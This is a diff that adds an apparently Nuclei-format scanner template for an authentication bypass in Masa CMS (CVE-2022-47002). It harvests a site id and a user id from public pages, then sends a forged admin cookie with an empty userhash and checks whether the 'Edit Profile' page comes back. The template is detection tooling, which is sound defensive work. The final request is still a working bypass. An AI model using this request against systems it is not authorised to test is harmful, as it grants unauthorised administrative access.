@@ -1,0 +1,61 @@
+id: cvd-2023-1871
+info:
+  name: Masa CMS Unauthorized Access Vulnerability (CVE-2022-47002)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Masa CMS is an enterprise content management platform. The vulnerability allows attackers to bypass access controls and potentially take control of the system.
+  reference:
+    - https://hoyahaxa.blogspot.com/2023/03/authentication-bypass-mura-masa.html
+  classification:
+    cve-id: CVE-2022-47002
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 8.0
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "siteid:\\\".*?\\\""
+    extractors:
+      - type: regex
+        name: siteid
+        internal: true
+        group: 1
+        regex:
+          - "siteid:\\\"(.*?)\\\""
+  - raw:
+      - |
+        GET /index.cfm/_api/json/v1/{{siteid}}/content/?fields=lastupdatebyid HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: lastupdatebyid
+        internal: true
+        group: 1
+        regex:
+          - "\\\"lastupdatebyid\\\":\\\"(.*?)\\\""
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "\\\"lastupdatebyid\\\":\\\".*?\\\""
+  - raw:
+      - |
+        GET /admin/?muraAction=cEditProfile.edit HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: userid={{lastupdatebyid}}; userhash=
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Edit Profile"
+      - type: word
+        part: body
+        words:
+          - "muraAction=cusers.editAddress&userID="
